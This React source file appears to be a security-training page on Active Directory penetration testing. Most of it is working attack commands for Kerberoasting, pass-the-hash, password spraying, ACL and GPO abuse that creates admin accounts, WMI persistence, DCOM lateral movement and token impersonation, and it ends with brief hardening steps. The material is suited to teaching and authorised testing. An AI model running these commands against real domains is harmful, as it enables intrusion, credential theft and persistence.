
import React from 'react';
import { Network, Shield, Bug, Terminal } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { 
  Accordion, 
  AccordionContent, 
  AccordionItem, 
  AccordionTrigger 
} from '@/components/ui/accordion';

const ActiveDirectorySection: React.FC = () => {
  return (
    <section className="space-y-12">
      <div className="mb-8">
        <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
          <Network className="text-cybr-primary" />
          Active Directory Penetration Testing
        </h2>
        <p className="mb-4">
          Active Directory is the identity backbone of most enterprise networks and a primary target for attackers.
          Testing Active Directory security requires understanding complex trust relationships, permission models,
          and authentication protocols.
        </p>
      </div>
      
      <div className="card mb-10">
        <h3 className="text-2xl font-bold mb-6">Key Areas to Focus</h3>
        
        <Accordion type="single" collapsible className="w-full">
          <AccordionItem value="domain-enum">
            <AccordionTrigger className="text-lg font-semibold py-4 hover:bg-gray-50 dark:hover:bg-gray-800 px-4 rounded-lg">
              <div className="flex items-center gap-2">
                <Bug className="text-cybr-primary h-5 w-5" />
                Domain Enumeration
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-4 pt-2">
              <p className="mb-4">
                Domain enumeration is the first step in Active Directory penetration testing, focusing on mapping out 
                the network to understand its structure, identify potential targets, and discover security weaknesses.
              </p>
              
              <div className="space-y-4 mb-4">
                <h4 className="text-md font-semibold">Key Enumeration Targets:</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>
                    <span className="font-semibold">User Enumeration</span>: Identifying user accounts, attributes, and group memberships.
                  </li>
                  <li>
                    <span className="font-semibold">Group Membership</span>: Mapping security groups and their members, especially privileged groups.
                  </li>
                  <li>
                    <span className="font-semibold">Trust Relationships</span>: Identifying domain trusts that could be exploited for lateral movement.
                  </li>
                  <li>
                    <span className="font-semibold">Domain Controller Identification</span>: Locating domain controllers and their roles.
                  </li>
                  <li>
                    <span className="font-semibold">LDAP Queries</span>: Using LDAP to extract valuable information from the directory.
                  </li>
                </ul>
              </div>
              
              <CodeExample
                language="powershell"
                title="Basic AD Enumeration with PowerShell"
                code={`# Get all domains in the forest
Get-ADForest

# Get all domain controllers
Get-ADDomainController -Filter *

# Get all users in the domain
Get-ADUser -Filter * -Properties *

# Get members of the Domain Admins group
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Get all computers in the domain
Get-ADComputer -Filter * -Properties *

# Get domain trusts
Get-ADTrust -Filter *

# Find service accounts (accounts with SPN set)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`}
              />
              
              <CodeExample
                language="powershell"
                title="LDAP Queries for Sensitive Information"
                code={`# PowerShell LDAP query example
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
$objSearcher.SearchRoot = $objDomain
$objSearcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"
$objSearcher.FindAll() # Find all users with "Don't require Kerberos preauthentication"

# LDAP query using ldapsearch (Linux)
ldapsearch -x -h domain-controller -D "DOMAIN\\user" -w "password" -b "DC=domain,DC=local" "(objectClass=user)"

# Using ldapdomaindump tool
ldapdomaindump -u 'DOMAIN\\user' -p 'password' 10.10.10.10 -o /tmp/ldapdump/`}
              />
            </AccordionContent>
          </AccordionItem>
          
          <AccordionItem value="auth-attacks">
            <AccordionTrigger className="text-lg font-semibold py-4 hover:bg-gray-50 dark:hover:bg-gray-800 px-4 rounded-lg">
              <div className="flex items-center gap-2">
                <Bug className="text-cybr-primary h-5 w-5" />
                Authentication Attacks
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-4 pt-2">
              <p className="mb-4">
                Active Directory authentication protocols like NTLM and Kerberos can be exploited through various attack techniques,
                allowing attackers to gain unauthorized access or elevate privileges.
              </p>
              
              <div className="space-y-4 mb-4">
                <h4 className="text-md font-semibold">Common Authentication Attacks:</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>
                    <span className="font-semibold">Kerberoasting</span>: Requesting service tickets for accounts with SPNs and cracking them offline.
                  </li>
                  <li>
                    <span className="font-semibold">AS-REP Roasting</span>: Exploiting accounts with "Don't require Kerberos preauthentication" to get crackable hashes.
                  </li>
                  <li>
                    <span className="font-semibold">Pass-the-Hash</span>: Using captured NTLM password hashes to authenticate without knowing the plaintext password.
                  </li>
                  <li>
                    <span className="font-semibold">Pass-the-Ticket</span>: Reusing Kerberos tickets to impersonate users without requiring their password.
                  </li>
                  <li>
                    <span className="font-semibold">Password Spraying</span>: Trying a few common passwords against many user accounts to avoid lockouts.
                  </li>
                </ul>
              </div>
              
              <CodeExample
                language="powershell"
                title="Kerberoasting Attack"
                code={`# PowerView Kerberoasting
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv -Path .\\kerberoasted_hashes.csv -NoTypeInformation

# Empire/Rubeus Kerberoasting
Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Cracking Kerberoast hashes with Hashcat
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt`}
                isVulnerable={true}
              />
              
              <CodeExample
                language="powershell"
                title="AS-REP Roasting Attack"
                code={`# Find users with Kerberos pre-authentication disabled
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Select-Object samaccountname

# Using Rubeus for AS-REP Roasting
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Using Impacket's GetNPUsers.py (Linux)
python GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# Cracking AS-REP hashes with Hashcat
hashcat -m 18200 asrep_hashes.txt wordlist.txt`}
                isVulnerable={true}
              />
              
              <CodeExample
                language="powershell"
                title="Pass-the-Hash Attack"
                code={`# PowerShell Invoke-TheHash
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 192.168.1.100 -Domain DOMAIN -Username Administrator -Hash 00000000000000000000000000000000:1a1dc91c907325c69271ddf0c944bc72 -Command "net user hacker Password123 /add" -Verbose

# Impacket tools (Linux)
python psexec.py -hashes 00000000000000000000000000000000:1a1dc91c907325c69271ddf0c944bc72 domain.local/administrator@192.168.1.100

# Using built-in Windows tools
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:1a1dc91c907325c69271ddf0c944bc72 /run:powershell.exe`}
                isVulnerable={true}
              />
              
              <CodeExample
                language="powershell"
                title="Password Spraying"
                code={`# Finding the domain password policy first (to avoid lockouts)
net accounts /domain

# PowerShell password spraying script
$users = Get-Content -Path .\\users.txt
$password = "Spring2023!"

foreach ($user in $users) {
    $domain = "DOMAIN"
    $secpw = ConvertTo-SecureString $password -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential ("$domain\\$user", $secpw)
    
    try {
        Invoke-Command -ComputerName DC01 -Credential $creds -ScriptBlock { hostname } -ErrorAction Stop
        Write-Host "[+] Success: $user : $password" -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed: $user : $password" -ForegroundColor Red
    }
    
    # Avoid detection - random delay between attempts
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
}`}
                isVulnerable={true}
              />
            </AccordionContent>
          </AccordionItem>
          
          <AccordionItem value="permission-models">
            <AccordionTrigger className="text-lg font-semibold py-4 hover:bg-gray-50 dark:hover:bg-gray-800 px-4 rounded-lg">
              <div className="flex items-center gap-2">
                <Bug className="text-cybr-primary h-5 w-5" />
                Permission Models
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-4 pt-2">
              <p className="mb-4">
                Active Directory permission models are complex and often misconfigured, creating privilege escalation paths
                that are difficult to detect with traditional security tools.
              </p>
              
              <div className="space-y-4 mb-4">
                <h4 className="text-md font-semibold">Key Permission Vulnerabilities:</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>
                    <span className="font-semibold">ACL Misconfigurations</span>: Excessive permissions granted to standard users on critical objects.
                  </li>
                  <li>
                    <span className="font-semibold">Delegation Issues</span>: Improper Kerberos delegation configurations that allow credential theft.
                  </li>
                  <li>
                    <span className="font-semibold">Group Policy Objects</span>: Misconfigured GPOs that can be exploited for privilege escalation.
                  </li>
                  <li>
                    <span className="font-semibold">AdminSDHolder</span>: Misconfigurations in the protected objects container that lead to persistence.
                  </li>
                  <li>
                    <span className="font-semibold">Shadow Admins</span>: Users with indirect administrative privileges through delegation or ACLs.
                  </li>
                </ul>
              </div>
              
              <CodeExample
                language="powershell"
                title="ACL Enumeration and Abuse"
                code={`# PowerView: Find interesting ACLs
Import-Module .\PowerView.ps1

# Find objects where a specific user or group has dangerous permissions
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match "helpdesk" }

# Find all modify rights/permissions for the given user/group
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|WriteDacl|WriteOwner" -and $_.IdentityReferenceName -match "helpdesk" }

# Find objects with wildcards in ACEs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceClass -match "Domain Users|Domain Computers|Authenticated Users" }`}
              />
              
              <CodeExample
                language="powershell"
                title="Exploiting ACL Vulnerabilities"
                code={`# Add a user to a group using GenericAll rights
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'hacker' -Verbose

# Reset a user's password using GenericWrite or ResetPassword rights
Set-DomainUserPassword -Identity 'targetuser' -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Verbose

# Grant DCSync rights to a user (WriteDacl on domain)
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity 'hacker' -Rights DCSync -Verbose

# Add SPN to a user account (for Kerberoasting)
Set-DomainObject -Identity 'targetuser' -Set @{'serviceprincipalname'='nonexistent/BLAHBLAH'}`}
                isVulnerable={true}
              />
              
              <CodeExample
                language="powershell"
                title="Kerberos Delegation Attacks"
                code={`# Find computers with Unconstrained Delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Find user accounts with Unconstrained Delegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Find computers with Constrained Delegation
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo

# Find users with Constrained Delegation
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo

# Find Resource-Based Constrained Delegation
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount | Where-Object {$_.PrincipalsAllowedToDelegateToAccount}`}
              />
              
              <CodeExample
                language="powershell"
                title="GPO Enumeration and Abuse"
                code={`# Enumerate GPOs
Get-GPO -All

# Get GPO applied to a specific OU
Get-GPO -All | Get-GPOReport -ReportType HTML -Path ./GPOReport.html

# PowerView: Find GPOs where specific users/groups have modify rights
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "Group-Policy-Container" }

# Abuse GPO Write permissions to create a new GPO that adds a user to local administrators
# First, find where the GPO is applied
Get-DomainOU | Get-DomainGPO

# Then modify the GPO with SharpGPOAbuse
SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author DOMAIN\\Administrator --Command "cmd.exe" --Arguments "/c net user hacker Password123 /add && net localgroup Administrators hacker /add" --GPOName "Vulnerable GPO"`}
                isVulnerable={true}
              />
            </AccordionContent>
          </AccordionItem>
          
          <AccordionItem value="lateral-movement">
            <AccordionTrigger className="text-lg font-semibold py-4 hover:bg-gray-50 dark:hover:bg-gray-800 px-4 rounded-lg">
              <div className="flex items-center gap-2">
                <Bug className="text-cybr-primary h-5 w-5" />
                Lateral Movement
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-4 pt-2">
              <p className="mb-4">
                Lateral movement techniques allow attackers to navigate through an Active Directory environment
                once they have established a foothold, moving from system to system to escalate privileges and access sensitive resources.
              </p>
              
              <div className="space-y-4 mb-4">
                <h4 className="text-md font-semibold">Common Lateral Movement Techniques:</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>
                    <span className="font-semibold">Overpass-the-Hash</span>: Converting NTLM hashes to Kerberos tickets for more stealthy movement.
                  </li>
                  <li>
                    <span className="font-semibold">Token Impersonation</span>: Stealing and reusing Windows access tokens to gain elevated privileges.
                  </li>
                  <li>
                    <span className="font-semibold">DCOM</span>: Using Distributed COM for remote code execution on other systems.
                  </li>
                  <li>
                    <span className="font-semibold">PowerShell Remoting</span>: Leveraging Windows Remote Management for lateral movement.
                  </li>
                  <li>
                    <span className="font-semibold">WMI Techniques</span>: Using Windows Management Instrumentation for remote execution.
                  </li>
                </ul>
              </div>
              
              <CodeExample
                language="powershell"
                title="WMI for Lateral Movement"
                code={`# WMI process creation
wmic /node:target.domain.local /user:domain\\username /password:password process call create "powershell -enc base64payload"

# PowerShell WMI
$username = 'domain\\username'
$password = ConvertTo-SecureString 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

Invoke-WmiMethod -ComputerName target.domain.local -Credential $cred -Class Win32_Process -Name Create -ArgumentList "powershell -enc base64payload"

# WMI Permanent Event Subscription (persistence)
# 1. Create a filter for the event
$Filter = Set-WmiInstance -Namespace "root\\subscription" -Class __EventFilter -ArgumentList @{
    EventNamespace = "root\\cimv2"
    Name = "EvilFilter"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    QueryLanguage = "WQL"
}

# 2. Create a consumer that executes your payload
$Command = "powershell -enc base64payload"
$Consumer = Set-WmiInstance -Namespace "root\\subscription" -Class CommandLineEventConsumer -ArgumentList @{
    Name = "EvilConsumer"
    CommandLineTemplate = $Command
}

# 3. Create a binding between the filter and the consumer
Set-WmiInstance -Namespace "root\\subscription" -Class __FilterToConsumerBinding -ArgumentList @{
    Filter = $Filter
    Consumer = $Consumer
}`}
                isVulnerable={true}
              />
              
              <CodeExample
                language="powershell"
                title="PowerShell Remoting"
                code={`# One-to-one PowerShell Remoting
$username = 'domain\\username'
$password = ConvertTo-SecureString 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

Enter-PSSession -ComputerName target.domain.local -Credential $cred

# One-to-many PowerShell Remoting
$computers = @("server1", "server2", "server3")
Invoke-Command -ComputerName $computers -Credential $cred -ScriptBlock {
    whoami
    hostname
    Get-Process | Select-Object -First 5
}

# Executing scripts from a file
Invoke-Command -ComputerName target.domain.local -FilePath C:\\path\\to\\script.ps1 -Credential $cred`}
                isVulnerable={true}
              />
              
              <CodeExample
                language="powershell"
                title="DCOM Lateral Movement"
                code={`# DCOM lateral movement using MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "target.domain.local"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c powershell -enc base64payload", "7")

# DCOM lateral movement using ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "target.domain.local"))
$com.Windows().Item().Document.Application.ShellExecute("cmd.exe", "/c powershell -enc base64payload", "C:\\Windows\\System32", $null, 0)

# DCOM lateral movement using ShellBrowserWindow
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Explorer", "target.domain.local"))
$com.Document.Application.ShellExecute("cmd.exe", "/c powershell -enc base64payload", "C:\\Windows\\System32", $null, 0)`}
                isVulnerable={true}
              />
              
              <CodeExample
                language="powershell"
                title="Token Impersonation"
                code={`# Using Mimikatz for token impersonation
privilege::debug
token::elevate
token::list
token::impersonate /id:1234

# Using PowerShell and Invoke-TokenManipulation
Import-Module .\\Invoke-TokenManipulation.ps1

# List available tokens
Invoke-TokenManipulation -ShowAll

# Impersonate a token
Invoke-TokenManipulation -ImpersonateUser -Username "domain\\Administrator"

# Create a process with the impersonated token
Invoke-TokenManipulation -ImpersonateUser -Username "domain\\Administrator" -CreateProcess "cmd.exe"

# Revert to original token
Invoke-TokenManipulation -RevToSelf`}
                isVulnerable={true}
              />
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>
      
      <div className="mb-10">
        <h3 className="text-2xl font-bold mb-6">Active Directory Attack Techniques</h3>
        
        <div className="space-y-6">
          <SecurityCard
            title="Kerberoasting"
            description="Technique that extracts service account credentials by requesting Kerberos service tickets for services with SPNs, then cracking them offline."
            icon={<Terminal className="h-6 w-6" />}
            severity="high"
          />
          
          <div className="card">
            <h4 className="text-xl font-semibold mb-3 flex items-center gap-2">
              <Terminal className="text-cybr-primary h-5 w-5" />
              PowerView Usage
            </h4>
            <p className="mb-3">
              PowerView is a powerful PowerShell tool for Active Directory reconnaissance:
            </p>
            
            <CodeExample
              language="powershell"
              code={`# Get all domain users
Get-DomainUser | select samaccountname, description

# Find users with SPN set (Kerberoasting)
Get-DomainUser -SPN | select name, serviceprincipalname

# Get domain computers
Get-DomainComputer | select name, operatingsystem

# Find admin access across the domain
Find-LocalAdminAccess

# Map domain trusts
Get-DomainTrust`}
              title="PowerView Commands for AD Enumeration"
            />
          </div>
          
          <div className="card">
            <h4 className="text-xl font-semibold mb-3 flex items-center gap-2">
              <Terminal className="text-cybr-primary h-5 w-5" />
              BloodHound Analysis
            </h4>
            <p className="mb-3">BloodHound visualizes attack paths in Active Directory environments:</p>
            
            <CodeExample
              language="cypher"
              code={`// Find all domain admins
MATCH (n:Group) WHERE n.name =~ ".*DOMAIN ADMINS.*" RETURN n

// Find shortest paths to domain admins
MATCH (n:User), (m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}), 
p=shortestPath((n)-[*1..]->(m)) 
RETURN p

// Find kerberoastable users
MATCH (n:User) WHERE n.hasspn=true RETURN n

// Find computers where Domain Admins are logged in
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN c.name, u.name`}
              title="BloodHound Cypher Queries"
            />
          </div>
        </div>
      </div>
      
      <div className="card">
        <h3 className="text-2xl font-bold mb-4">Active Directory Defensive Measures</h3>
        <div className="space-y-4">
          <div>
            <h4 className="text-lg font-semibold">Securing Active Directory</h4>
            <CodeExample
              language="powershell"
              code={`# Enable Protected Users group for privileged accounts
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"

# Enable LAPS (Local Administrator Password Solution)
Import-Module AdmPwd.PS

# Enable Audit settings
Auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable

# Enable Group Managed Service Accounts (gMSA)
Add-KdsRootKey -EffectiveTime (Get-Date).AddHours(-10)
New-ADServiceAccount -Name "Service01" -DNSHostName "service01.domain.local" -ServicePrincipalNames "HTTP/service01.domain.local" -PrincipalsAllowedToRetrieveManagedPassword "Domain Computers"

# Set Account is Sensitive and Cannot be Delegated
Set-ADUser -Identity "AdminUser" -AccountNotDelegated $true`}
              title="Active Directory Hardening Measures"
              isVulnerable={false}
            />
          </div>
        </div>
      </div>
    </section>
  );
};

export default ActiveDirectorySection;
